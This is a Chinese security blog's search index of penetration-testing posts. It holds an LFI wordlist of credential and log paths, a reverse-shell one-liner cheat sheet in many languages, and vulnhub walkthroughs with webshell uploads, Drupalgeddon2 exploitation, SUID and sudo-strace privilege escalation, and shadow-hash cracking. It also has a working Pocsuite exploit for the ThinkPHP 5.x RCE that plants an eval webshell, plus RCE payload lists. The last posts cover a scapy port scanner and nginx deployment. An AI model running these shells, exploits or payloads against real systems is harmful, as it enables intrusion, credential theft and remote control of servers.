<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[记一次LFI-Fuzz字典构造]]></title>
    <url>%2F2019%2F04%2F01%2FLFI-Fuzz%2F</url>
    <content type="text"><![CDATA[Fuzz字典构造的必要性当遇到一处文件包含漏洞时，一般操作大致如下 包含源码进行代码审计 包含文件(如日志)进行GetShell 包含配置文件获得敏感信息 对于后两个而言，手动一个个的去进行测试无疑是不够优雅的所以就有了这次字典构造。 Linux文件路径收集 对于路径来说是有绝对路径和相对路径两种，考虑到限制路径的可能性将以下所有目录加上多个../以保证在相对路径时达到绝对路径的效果../../../../../../../../../../* Apache日志/var/log/apache/access.log/var/log/apache/access_log /var/log/apache/error_log /var/log/apache/error.log /var/log/apache2/access.log/var/log/apache2/access_log/var/log/apache2/error.log/var/log/apache2/error_log/usr/local/apache/logs/access_log /usr/local/apache/logs/access.log /usr/local/apache/logs/error_log /usr/local/apache/logs/error.log /usr/local/apache2/logs/access_log /usr/local/apache2/logs/access.log /usr/local/apache2/logs/error_log /usr/local/apache2/logs/error.log /usr/local/app/apache/logs/access_log /usr/local/app/apache/logs/access.log /usr/local/app/apache/logs/error_log /usr/local/app/apache/logs/error.log /usr/local/app/apache2/logs/access_log /usr/local/app/apache2/logs/access.log /usr/local/app/apache2/logs/error_log /usr/local/app/apache2/logs/error.log WWW日志/var/www/logs/access.log/var/www/logs/access_log/var/www/logs/error_log/var/www/logs/error.log/var/log/access.log/var/log/access_log /var/log/error.log/var/log/error_log/var/log/httpd/access_log /var/log/httpd/error_log/var/log/httpd/access.log /var/log/httpd/error.log/etc/httpd/logs/acces_log /etc/httpd/logs/acces.log /etc/httpd/logs/error_log /etc/httpd/logs/error.log /etc/httpd/conf/httpd.conf SSH日志/var/log/secure/var/log/auth.log FTP日志/var/log/messages 配置文件#mysql 配置文件/etc/my.conf#Apache2默认配置文件/usr/local/app/apache2/conf/httpd.conf/usr/local/app/apache2/conf/extra/httpd-vhost.conf#PHP相关配置/usr/local/app/php5/lib/php.ini#用户&amp;密码信息/etc/passwd/etc/shadow Session/var/lib/php/session/sess_+sessionid Win文件路径收集FTP日志 ex+年份的末两位数字+月份+日期，如2019年4月02日的WWW日志文件是ex190402.log %systemroot%/system32/logfiles/msftpsvc1/ex190402.log WWW日志 ex+年份的末两位数字+月份+日期。如2019年4月02日的WWW日志文件是ex190402.log %systemroot%/system32/logfiles/w3svc1/ex190402.log 配置文件%systemroot%\system32\inetsrv\MetaBase.xml #IIS配置文件%systemroot%\php.ini #php配置信息c:\ProgramFiles\mysql\my.ini #MySQL配置 最后除去一些比较特殊没法通用化的，那么一份热乎乎的Fuzz字典就这么出炉啦! 接下来就是长时间的字典积累维护了]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux花式弹shell指南]]></title>
    <url>%2F2019%2F03%2F26%2Freverse-shell%2F</url>
    <content type="text"><![CDATA[nc nc -lvvp port nc -e /bin/bash ip port Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.239.131",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' Telnettelnet 192.168.220.131 6666 | /bin/bash | telnet 192.168.220.131 6665nc -lvvp 6666 #命令传输窗口nc -lvvp 6665 #命令结果显示窗口 mknod test p &amp;&amp; telnet 192.168.220.131 6666 0&lt;test | /bin/bash 1&gt;testnc -lvvp 6666 PHP php -r '$sock=fsockopen("192.168.220.131",6666);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' &lt;?php$sock = fsockopen('192.168.220.131', 6666);$descriptorspec = array( 0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock ); $process = proc_open('/bin/sh', $descriptorspec, $pipes); proc_close($process);?&gt; Ruby *ruby -rsocket -e 'f=TCPSocket.open("192.168.220.131",6666).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.220.131","6666");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end' Perl perl -e 'use Socket;$i="192.168.220.131";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' Java Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]&#123;"/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"&#125;);p.waitFor();Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]&#123;"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"&#125;);p.waitFor(); Lua lua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.220.131','6666');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透实战:Billu_b0x靶机入侵]]></title>
    <url>%2F2019%2F03%2F26%2FBillu_b0x%2F</url>
    <content type="text"><![CDATA[0x01 简介 作者:billu 难度定位:中等 目标:获得root 靶机:192.168.220.130 攻击机:192.168.220.129 0x02 SQL注入GetShell? port 22port 80 很显然是SQL注入，但事情并没有那么简单先是经过一波手工测试，发现一个奇怪问题，不管是什么参数，都只会返回200和弹窗TryAgain 甚至全部置空，也是返回200先后测试过所有可控参数包括cookie，Referer，PHPSESSID最后绝望的拿去sqlmap跑，还调了最高级以及尝试了一些tamper结果就是这样 0x03 关键还得跑目录我都怀疑SQL注入是个幌子那么，唯一可行的就是跑目录寻找其他漏洞了 还好确实发现一些有问题的地方in.php是phpinfoadd.php有文件上传 test.php像是文件包含 还有一些存在目录遍历，不过都是些图片，不存在价值 0x04 假的文件上传&amp;无法绕过的SQL注入文件包含处是POST 账号除root外中有一个账号ica那么先来包含一下add.php的源码 还有这种操作？？？？ 还好，数据库信息GET，但并没有3306 用户名:billu密码: b0x_billu数据库名: ica_lab另外，主页的注入源码也通过包含拿到 我在本地搭建了环境，做了许多测试都无法绕过……有看到一些wp是说过滤的是\&#39;但我实际测试，过滤的是&#39;，导致无法逃逸引号而别的wp给出的payload我也无法使用，emmm 0x05 phpmyadmin&amp;文件上传柳暗花明又一村，目录跑出了新的东西phpmy这名字一看就有戏 通过包含得到的用户名密码有了用武之处 成功得到登录账户和密码 账户:biLLu密码:hEx_it 顺道尝试mysql写shell和loadfile，可惜权限过低那么利用拿到的信息登录主页来到了panel.php 有一个增加用户功能，可以真的上传文件 同时利用之前的文件包含拿到源码 emmmm，没关系，还有show user中还有一处文件包含 先来上传个马 0x06 文件包含Getshellif($choice==='show')&#123; include($dir.'/'.$choice.'.php'); die();&#125;else&#123; include($dir.'/'.$_POST['load']);&#125; 可以看到panel中show user功能源码如上构造一个POST请求 load=/uploaded_images/reverse.jpg&amp;continue=continue 千辛万苦，终于拿到了shell上来先是素质二连，whoami ls毫无回显，刚开始以为是权限问题，结果断连时有回显了，期间检测到有py环境 python -c 'import pty; pty.spawn("/bin/sh")' 那么又到了激动人心的提权时刻了 先是find一波没什么特殊，uname一波，哟吼 wget http://192.168.220.131:8001/37292.c -O /tmp/a.ccd /tmpgcc a.c -o pwnchmod +x pwn./pwn 看来这个靶机难度是偏向web的… 0x07 小结先是跑目录得到许多页面信息发现test.php存在文件包含漏洞，通过包含其他页面得到源码，并进行审计包含到c.php得到数据库密码和用户，在phpmyadmin登录找到主页用户密码登录主页，跳到panel.php，有图片上传和展示功能的文件包含通过包含图片马，反弹得shell，通过linux内核提权到root整个过程一环扣一环，少一步就失败 多说一句包含拿shell的是panel.php这个页面，而test.php那个包含用的是readfile函数，是没办法getshell的]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透实战:DC-1靶机入侵]]></title>
    <url>%2F2019%2F03%2F23%2FDC-1%2F</url>
    <content type="text"><![CDATA[0x01 序章 作者:DCAU 难度定位:未知，初级? 目标:共有五个flag，但最终目标是在root的主目录中 0x02 新玩意 这次来尝试一下新玩意，NetDiscover 这个发现工具我还是第一次用，虽然听说过很多次 # 先指定一下网卡sudo netdiscover -i eth2 192.168.135.131 鉴于上次的经验，这次我指定了更全面的扫描 nmap -sV -sS -p- 192.168.135.131 先试下admin，Access denied，好吧 那来跑下目录 然后…..然后站就被我跑崩了,🤦つ﹏⊂ 重启一下虚拟机，不跑了不跑了，先看看robots吧 通过UPGRADE.txt和MAINTAINERS.txt基本可以确认是Drupal 7.x(9 or 10) 0x03 Drupalgeddon2 GetShell 对于Drupal，我找到一个历害的洞，是远程命令执行 Msf中也有，但利用并不顺利 use exploit/unix/webapp/drupal_drupalgeddon2set rhosts 192.168.135.131set payload php/meterpreter_reverse_tcpset lhost 192.168.135.130run 反而在searchsploit中找到一个基于ruby的可用exp 成功拿到了shell，但我不死心再度尝试msf set payload php/reverse_phprun 事实证明，能弹回来 我再次进行一些测试 php/meterpreter_reverse_tcp PHP Meterpreter, Reverse TCP Inlinephp/meterpreter/reverse_tcp PHP Meterpreter, PHP Reverse TCP Stagergeneric/shell_reverse_tcp Generic Command Shell, Reverse TCP Inlinephp/reverse_php PHP Command Shell, Reverse TCP (via PHP) 前两者一个是使用命令行回连，一个是使用php回连，php回连能连上但无权限 而普通的generic和php都能正常工作，好的，可以说明是meterpreter的锅 然而体验还不如那个ruby的exp，卒~ 0x04 Flag1&amp;Flag2进来web目录下有一个flag1 DC-1&gt;&gt; cat flag1.txtEvery good CMS needs a config file - and so do you. 很明显的提示，一顿搜索，Drupal的配置文件在sites/default/settings.php Getflag2db:drupaldbusername:dbuserpassword:R0ck3t 那我们连上去mysql看看 mysql -udbuser -pR0ck3t 然而乱七八糟啥有用的信息都找不到 期间我又重新弹了一次shell，后来发现 哇咔咔，你懂的 gcc -o2 up.c 随后 我在本机搭建了一个简易的python服务器 并wget拿到exp chmod +x 2./2whoamiroot 然后再看一下别的路 0x05 SSH爆破提权这时我又想起了flag2的提示，跑字典.同时passwd中一个账号吸引了我的注意 就是它了。 [22][ssh] host: 192.168.135.131 login: flag4 password: orange 橙子，发现home下还有个flag4 0x06 基于find提权 注意：我在发现flag4前就已经通过find拿到root了，为了方便观看我把过程放到了这里，所以有些图片中的终端名对不上了 find / -perm -4000 2&gt;/dev/null find / -exec /bin/sh \; -quit find中提供了一处命令执行功能 0x07 Flag3虽然已经拿到了root并集齐了四个flag 但并没有找到flag3，同时想起flag2中将我们引向数据库的目的 数据库我仔细翻找过，并没有特殊的东西，我们能做的东西不多比如:得到管理员密码 那有什么用呢，登录后台? 如果是一般情况，估计只有跑john了，但这次不一样，我们知道盐 啊！还有更省事的方法，drupal自带了了加密 $S$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p. 到数据库中 update users set pass = '$S$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p.' where uid=1; 看样子我是直接跳过了hint，拿root了emmmmmm]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透实战:UnknownDevice靶机入侵]]></title>
    <url>%2F2019%2F03%2F22%2FUnknownDevice%2F</url>
    <content type="text"><![CDATA[0x01 前言 难度定位:中级 作者：Ajay Verma 目标:获得root并阅读/root/flag.txt 0x02 主机扫描先扫一波 Nmap scan report for 192.168.135.129Host is up (0.0012s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION31337/tcp open http SimpleHTTPServer 0.6 (Python 2.7.14)|_http-server-header: SimpleHTTP/0.6 Python/2.7.14|_http-title: Website By Unknowndevice64 MAC Address: 00:0C:29:F9:6F:F5 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop port 31337 python的简易HTTPServer 代码有hint 0x03 图片隐写术 是图片隐写，先后拿HxD和Stegsolve分析过，都不行 看了wp才知道要用steghide，出师不利 steghide --extract -sf key_is_h1dd3n.jpg 密码是h1dd3n 得到一串奇怪的东西 ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.-----------------.&lt;----------------.--.++++++.---------.&gt;-----------------------.&lt;&lt;+++.++.&gt;+++++.--.++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++.-----------------. 看着这串，倒是想到了以前接触过的jsfuck，但其实又不一样 查了些资料感觉可能是BrainFuck ud64:1M!#64@ud 还以为是啥加密，折腾许久，再次走投无路….偶然间发现，这名字emmm 这是用户名+密码?可是没有可以登录的地方啊，端口只有31337 sudo nmap -sV -p 1-65535 192.168.135.129 指定全端口，再扫一次，1337有SSH，看来就是它了 进来了??殊不知真正的挑战才刚刚开始 0x04 rbash限制逃逸上来就是ls ud64@unknowndevice64_v1:~$ ls-rbash: /bin/ls: restricted: cannot specify `/' in command names 先来看看这个rbash是个什么东西 这么变态???，经过一番搜索 发现可以通过按两下tab键调出可以执行的程序 最终找到两处可绕过限制shell的方法 vi 执行!/bin/sh export PATH=$PATH:/bin/ export PATH=$PATH:/usr/bin 但权限受限，环境变量是只读，只有vi了 很好，目前已经获得了一个’’较’’正常的shell，但是权限依然很低 事实上这只是在vi中运行的一个’shell’，那么先把它提到普通的shell 比如这样 这是因为在vi的shell中已经拥有了环境变量的写入权限了 0x05 破釜沉舟strace到root现在依旧没有办法读到root下的flag 查看了passwd，除root外，有bash的账户还有一个operator root:x:0:0::/root:/bin/bashoperator:x:11:0:operator:/root:/bin/bashud64:x:1000:1000::/home/ud64:/bin/rbash 但不知道密码，也找不到可行的内核提权 再度陷入僵局 最终，在先后检查了环境变量和进程后，在检查sudo可执行命令时发现 可以用sudo执行/usr/bin/sysud64但我并不清楚这是什么程序，幸好有help 其实这是strace，一个用以诊断，调试的程序，没错调试就意味着运行! sudo sysud64 -o /dev/null /bin/bash -i &gt;&amp; /dev/tcp/192.168.135.130/4444 0&gt;&amp;1 以root权限进行一次弹shell并把所有调试输出到最爱的黑洞 事后发现其实可以直接执行/bin/bash sudo sysud64 -o /dev/null /bin/bash 我不管，我就是要弹，小声逼逼 0x06 GetFlagA hacker does for love what others woud not do for money.]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透实战:HackInOS靶机入侵]]></title>
    <url>%2F2019%2F03%2F21%2FHackInOS%2F</url>
    <content type="text"><![CDATA[0x01 前言 难度定位是初级 CTF风格 作者: Fatih Çelik 0x02 Nmap一把梭 获得信息 开放端口 20 22 514 8000 apache 2.4.25 WordPress 5.0.3 robots.txt ban了/upload.php和/uploads 0x03 WPScan一把梭有wp的话，先访问8000看看 emmm….应该是localhost的问题，先不管了 既然是wordpress先上wpscan扫一波吧 wpscan --url http://192.168.56.101:8000 但是 Scan Aborted: Unable to identify the wp-content dir, please supply it with --wp-content-dir 搜了下，类似的问题很少，几乎没有… 最后在github上找到个上古年代的反馈 说可能是重定向的问题，但我在响应头里没找到任何重定向？ 这难道是靶机作者挖的坑? 那就指明一下wp-content的目录吧 wpscan --url http://192.168.56.101:8000 --wp-content-dir wp-content php 7.2.15 xmlrpc.php wp-cron.php 扫出有一枚XSS漏洞，但这有啥用?摔(′д｀ )…彡…彡 让我打谁cookie去?emmmm，陷入沉思 枚举一下主题漏洞和插件漏洞 wpscan --url http://192.168.56.101:8000 --wp-content-dir wp-content --enumerate vt[i] No themes Found. wpscan --url http://192.168.56.101:8000 --wp-content-dir wp-content --enumerate vp[i] No plugins Found. 凉凉 灵机一动看到有xmlrpc.php 拿出msf爆破一发 use auxiliary/scanner/http/wordpress_xmlrpc_loginset rhosts 192.168.56.101set rport 8000set threads 200set USER_FILE '/root/top10.txt'set PASS_FILE '/root/top10.txt'set STOP_ON_SUCCESS truerun 0x04 略艰难的Getshell之路好的，趁爆破时间逛一下robots ban的页面 我………. 我都在折腾个啥 上个图片试试 这算成功了? 访问一下不存在…改名了还是??? hint来了 好的又被坑了一下，这才是正确url https://github.com/fatihhcelik/Vulnerable-Machine---Hint upload.php源码get &lt;?phpif(isset($_POST["submit"])) &#123; $rand_number = rand(1,100); $target_dir = "uploads/"; $target_file = $target_dir . md5(basename($_FILES["file"]["name"].$rand_number)); $file_name = $target_dir . basename($_FILES["file"]["name"]); $uploadOk = 1; $imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION)); $type = $_FILES["file"]["type"]; $check = getimagesize($_FILES["file"]["tmp_name"]); if($check["mime"] == "image/png" || $check["mime"] == "image/gif")&#123; $uploadOk = 1; &#125;else&#123; $uploadOk = 0; echo ":)"; &#125; if($uploadOk == 1)&#123; move_uploaded_file($_FILES["file"]["tmp_name"], $target_file.".".$imageFileType); echo "File uploaded /uploads/?"; &#125;&#125;?&gt; 是getimagesize先做个马cat a.png a.php &gt; b.php 上传成功了 emmm写个脚本吧 import hashlibimport requestsfor i in range(1,100): t = 'b.php'+str(i) hash = hashlib.md5(t.encode()) url = 'http://192.168.56.101:8000/uploads/'+hash.hexdigest()+'.php' rs = requests.get(url) if rs.status_code != 404: print url 反复多次测试,没有??怎么可能，翻了好多资料，翻了好多国外的wp，思路没问题 只是多数是写成字典进行爆破的 但是就是没这个文件 直到 我发现这个上一秒还在,下一秒就消失的文件 真相只有一个，这站有…….有’狗’ 事后我找了许多paper都是可以直接上传的，包括一句话，那么问题来了，我的马呢? 前后试过msf的php反弹和普通的php反弹，一句话，加密一句话，但并没有用 msf的表现最糟糕，不知道是什么原因，根本没有权限，连目录浏览权限都没有……. 最后找了个php弹shell的方法 GIF89a&lt;?php$sock = fsockopen('192.168.56.102', 4444);$descriptorspec = array( 0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock);$process = proc_open('/bin/sh', $descriptorspec, $pipes);proc_close($process);?&gt; cat也懒得cat了，直接加个GIF89a也一样 nc -lvvp 4444 0x05 PWN!!!!!总算拿到shell了,可以肯定是有某种检测机制的，只要我写文件就直接断连，并且马儿被删，我可怜的马儿 # 查找suidfind / -perm -4000 2&gt;/dev/null# 查看root密码tail -c1G /etc/shadowroot:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7::: 密文拿到手,保存为rules.txt，那john跑一下密码 john --wordlist=pass.lst --rules rules.txt 跑出来是john,醉了 尝试sudo但command not found，su报错su: must be run from a terminal 还好有py环境 echo "import pty; pty.spawn('/bin/bash')" &gt; /tmp/asdf.pypython /tmp/asdf.py ( •̀ ω •́ )y 但是进程少到不对劲，最起码的数据库的进程也没有 ping了下db是172.18.0.3，嗯? mysql -h 172.18.0.3 -uwordpress -pwordpress 连上去翻了一下 ssh_cred，见名知义 上cmd5查了一下是123456……… ssh上去 原来是docker，我说怎么进程这么干净不像ubuntu 0x06 GetFlag我以为这就完了 结果说要找到flag才行….. mysql和wordpress都明确的目的 那么就是ubuntu这个镜像了 docker run -v /:/ameer -i -t ubuntu /bin/bash在/ameer/root有个flag]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基于Pocsuite的ThinkPHP 5.x 远程代码执行漏洞利用]]></title>
    <url>%2F2019%2F01%2F11%2Fthinkphp-5-x-pocsuite%2F</url>
    <content type="text"><![CDATA[半醉半醒日复日,花落花开年复年。 2019了。 漏洞分析 漏洞分析有很多大佬巨佬做过了，我就不献丑了emmmm给大家找了一篇分析paper，建议去研究研究 水泡泡 漏洞详情 漏洞影响:Thinkphp 5.0.23及5.1.31以下(即12月9日安全更新前所有版本) vulnspy的漏洞源码 官方漏洞源码 官方github源码 Thinkphp v5.0.x补丁 Thinkphp v5.1.x补丁 seebug 注意:官网只有5.0.x的版本，测试5.1.x需要到github自己clone一个再用composer安装或者用vulnspy的 composer 全平台共有具有漏洞的类可以继续挖掘更多payload，我就不(tai)来(cai)了(le) think\Routethink\Loaderthink\Errorthink\Appthink\Envthink\Configthink\Hookthink\Langthink\Requestthink\Log 编写前准备对于网上的payload进行了收集,本打算基于以下四个payload进行Poc的编写 Request/inputindex.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1index.php?s=index/\think\Request/input&amp;filter=system&amp;data=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php Request/cacheindex.php?s=index/\think\request/cache&amp;key=1|phpinfoindex.php?s=index/\think\request/cache&amp;key=dir|systemindex.php?s=index/\think\request/cache&amp;key=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php|system container/invokefunctionindex.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoamiindex.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E app/invokefunctionindex.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoamiindex.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20phpinfo();?&gt;%22%20&gt;%20info.phpindex.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E 还有一个貌似只能写文件的 index.php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20eval($_POST[123]);?%3C Payload测试测试的时候发现了些问题 前三个paylaod对于5.0.x无效，只有第四个有效 而5.1.x则通杀 结合水泡泡的分析 那就只有app/invokefunction一条路可以走了 Poc的编写#!/usr/bin/env python# coding: utf-8from pocsuite.net import reqfrom pocsuite.poc import POCBase, Outputfrom pocsuite.utils import registerclass ThinkphpPoC(POCBase): vulID = '97767' version = '1' author = ['p1n3'] vulDate = '2019-01-11' createDate = '2019-01-11' updateDate = '2019-01-11' references = ['https://www.seebug.org/vuldb/ssvid-97767'] name = 'Thinkphp 5.0.23及5.1.31以下 远程代码执行' appPowerLink = 'http://www.thinkphp.cn/' appName = 'Thinkphp' appVersion = '5.x' vulType = 'RCE' desc = ''' 由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下 可能的远程代码执行导致getshell，受影响包括Thinkphp全版本，建议更新到最新版或开启强制路由 ''' samples = [''] def _verify(self): result = &#123;&#125; payload = self.url + '/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=print_r&amp;vars[1][]=fae0b27c451c728867a567e8c1bb4e53' response = req.get(payload) # md5(666) 的值 if 'fae0b27c451c728867a567e8c1bb4e53' in str(response.content): result = &#123;'VerifyInfo': &#123;&#125;&#125; result['VerifyInfo']['payload'] = payload return self.parse_result(result) def _attack(self): result = &#123;&#125; info = &#123; 'ResultCode': &#123; 'a': False, 'b': False &#125; &#125; payload1 = self.url + '/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20eval($_POST[666]);?%3E' payload2 = self.url + '/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array' \ '&amp;vars[0]=system&amp;vars[1][]=echo%20%22&lt;?php%20eval($_POST[666]);?&gt;%22%20&gt;%20info.php' req.get(payload1) if req.get(self.url + '/info.php').status_code == 200: result = &#123;'AttackInfo': &#123;&#125;&#125; info['ResultCode']['a'] = True result['AttackInfo']['payload'] = payload1 else: req.get(payload2) if req.get(self.url + '/info.php').status_code == 200: result = &#123;'AttackInfo': &#123;&#125;&#125; info['ResultCode']['b'] = True result['AttackInfo']['payload'] = payload2 if info['ResultCode']['a'] or info['ResultCode']['b']: result['AttackInfo']['shell'] = self.url+'/info.php' result['AttackInfo']['pass'] = '666' return self.parse_result(result) def parse_result(self, result): output = Output(self) if result: output.success(result) else: output.fail('The vulnerability does not appear to be available!') return outputregister(ThinkphpPoC) Poc测试 还是第一次用Pocsuite，写的不好…你来打我呀 相比pentestDB等，Pocsuite体验非常不错，打算以后就一直使用Pocsuite好了(如果有更好的框架请务必私信我) verify模式忘截图了 attack模式会直接在同目录下写一句话木马 祭出法器中国蚁剑 文件是info.php 密码666 很好 enjoy it]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python打造基于scapy的扫描器]]></title>
    <url>%2F2018%2F11%2F17%2Fweb-scan%2F</url>
    <content type="text"><![CDATA[准备事宜scapy库git clone https://github.com/secdev/scapy.gitcd ./scapypython setup.py 构思 放个三次握手原理图与被扫描机进行SYN握手，有回应就是开放了端口基本思路参考 scapy官方文档 如何用Scapy写一个端口扫描器？ Python的无状态SYN快速扫描 完整的项目我放到了github上 这里 预定义的全局变量#目标ip与端口ports = ''target = ''#定义是否用socket扫描，默认用synsocket_scan_mode = False#合计socket扫到端口socket_flag = 0# Pn = True# socket扫描多线程锁lock = threading.Semaphore(value=1)#默认扫描的端口default_ports = [...]#端口可能对应的服务port_list = &#123;...&#125; getopt模块处理用户输入def usage(): #用法提示 print "Usage: pineScan.py -t target_host (-p)" print " -h --help" print " -t --target" print " example: -t 127.0.0.1" print " -p --port" print " example: -p 80,445" print " -s --socket" #print " -Pn --skip host discovery" def init(): global ports global target global socket_scan_mode try: #对用户输入的参数解析 opts, args = getopt.getopt(sys.argv[1:],"hp:t:s",["help","port","target","socket"]) for o,a in opts: if o in ("-h","--help"): usage() exit(0) elif o in ("-t","--target"): target = a elif o in ("-p","--port"): ports = a elif o in ("-s","--socket"): socket_scan_mode = True elif o in ("-Pn"): Pn = True else: print "Unhandled Option" exit(0) if target: #调用扫描 portScan(target, ports) else: usage() exit(0) except Exception as e: print str(e) print usage() socket扫描核心代码socket扫描写都写了，懒得删了…emmmmdef socket_scan(target, port): #socket全连接 global socket_flag try: conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #设置超时 conn.settimeout(2) conn.connect((target, port)) lock.acquire() print '[*] %d/tcp open %s\r' % (port,port_list[port]) #计算开启的端口 socket_flag = socket_flag + 1 except: #线程释放 lock.release() conn.close() syn扫描核心代码def syn_scan(ip,ports): #构造数据包 ans,unans=sr(IP(dst=ip)/TCP(dport=ports, flags='S'),timeout = 5) print "PORT STATE SERVICE" for snd,rcv in ans: #从返回包读取数据 port = rcv.sprintf("%IP.sport%") service = rcv.sprintf("%TCP.sport%") flag = rcv.sprintf("%TCP.flags%") if flag == 'SA': #SA是开放了端口 if is_number(service): #包中信息的读取若为数字，调用字典查询可能的对应服务并替换 if service in port_list.keys(): service = port_list[service] else: service = 'unknown' #格式化输出 print '%-10.5sopen %s' % (port,service) 扫描调用模块#以逗号分割端口号ports = ports.split(",")#对string类型列表处理成int类型ports = [int(i) for i in ports]#判断是socket扫描还是syn扫描if socket_scan_mode: for port in ports: #多线程调用socket thread = threading.Thread(target=socket_scan, args=(target, int(port))) thread.start() if socket_flag == 0: print "socket scan done!but no port is open"else: #syn中整个列表传输执行比for循环更快 syn_scan(target,ports) 实际结果展示还算可以，技术所限，大佬轻喷]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小站迁移记(Nginx自动化部署)]]></title>
    <url>%2F2018%2F11%2F09%2Fweb-migration%2F</url>
    <content type="text"><![CDATA[SSH部署阿里云vps直接在阿里云控制台导入ssh-keygen生成的秘钥秘钥生成看这里ssh git@serverip -i ~/.ssh/id_rsa 安装nginx apt-get updateapt-get install nginx/etc/init.d/nginx start 访问ip,看到Welcome to nginx! 配置成功了 安装Gitsudo apt-get install git#创建一个git用户,用于运行git服务sudo adduser git#导入秘钥到/home/git/.ssh/authorized_keys#修改权限chmod 600 authorized_keys#初始化git仓库git init --bare blo.git#更改所有权sudo chown -R git:git blog.git#禁止shell登录修改/etc/passwd的git:x:1003:1003::/home/git:/bin/bash改为git:x:1003:1003::/home/git:/usr/bin/git-shell#克隆远程仓库git clone git@serverip:/home/git/blog.git 配置nginx懒的配了,直接把html删了git clone /home/git/blog.git html 从仓库克隆过来直接替换掉 配置Git钩子hooksblog.git文件家里有一个hooks文件夹里边有各种hook例子$ vim blog.git/hooks/post-receive 写如下代码#!/bin/shunset GIT_DIR #还原环境变量，否则会拉不到代码cd /var/www/htmlgit pull origin master 注意要chmod 755 blog.git/hooks/post-receive 测试本地修改hexo配置文件deploy: type: git # 部署到我的git仓库 repo: git@serverip:/home/git/blog.git # 分支默认master branch: master ssh参考 nginx安装参考 nginx配置参考 Git服务器搭建参考 详细参考]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>vps</tag>
